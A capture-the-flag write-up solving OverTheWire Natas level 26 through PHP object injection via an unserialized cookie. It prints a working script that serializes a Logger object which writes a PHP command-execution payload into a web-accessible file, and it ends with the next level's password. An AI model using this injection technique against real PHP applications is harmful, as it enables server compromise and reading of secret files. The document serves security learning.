# Natas 26 Solution

As we inspect the code, we notice that the `Logger` class is suspiciously unused.

```php
class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;
  
    function __construct($file){
        // initialise variables
        $this->initMsg="#--session started--#\n";
        $this->exitMsg="#--session end--#\n";
        $this->logFile = "/tmp/natas26_" . $file . ".log";
  
        // write initial message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$initMsg);
        fclose($fd);
    }                       
  
    function log($msg){
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$msg."\n");
        fclose($fd);
    }                       
  
    function __destruct(){
        // write exit message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->exitMsg);
        fclose($fd);
    }                       
}
```

Furthermore, there are multiple calls to PHP's `unserialize` function, passing in unsanatized user input.

```php
if (array_key_exists("drawing", $_COOKIE)){
    $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
    // ...
}
// ...
if (array_key_exists("drawing", $_COOKIE)){
    $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
}
```

As it turns out, there is a [PHP Object Injection Vulernability](https://www.owasp.org/index.php/PHP_Object_Injection) with the `unserialize()` function. If we serialize a `Logger` class, when the PHP script `unserialize`s it, it will run the `__destruct()` function of `Logger`.

Knowing this, all that's left to do is to generate a malicious Logger instance, serialize it, encode it in base64, and set the value of the `drawing` cookie.

We can write a PHP script to help us. ([PHP File Link](../resources/natas26.php))
```php
<?php

class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($file){
        // initialise variables
        $this->initMsg="";
        $this->exitMsg="<?php passthru('cat /etc/natas_webpass/natas27') ?>";

        $this->logFile = "/var/www/natas/natas26/img/evilfile.php";

        // write initial message
        // $fd=fopen($this->logFile,"a+");
        // fwrite($fd,$initMsg);
        // fclose($fd);
    }

    function log($msg){
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$msg."\n");
        fclose($fd);
    }

    function __destruct(){
        // write exit message
        // $fd=fopen($this->logFile,"a+");
        // fwrite($fd,$this->exitMsg);
        // fclose($fd);
    }
}

$maliciousLogger = new Logger("myfile");

echo "Evil serialized code!!\n";
echo serialize($maliciousLogger) . "\n";
echo "End evil serialized code\n\n\n";

echo "Base64 encoding:\n\n";
echo base64_encode(serialize($maliciousLogger));
```

In particular note the following lines:
```php
$this->exitMsg="<?php passthru('cat /etc/natas_wbpass/natas27') ?>";
$this->logFile="/var/www/natas/natas26/img/evilfile.php";
```

Finally, we can run the PHP file, copy-paste the encoded serialized object into the value of the cookie `drawing`, reload the page, and visit [http://natas26.natas.labs.overthewire.org/img/evilfile.php](http://natas26.natas.labs.overthewire.org/img/evilfile.php).

**Username: natas27**  
**Password: 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ**
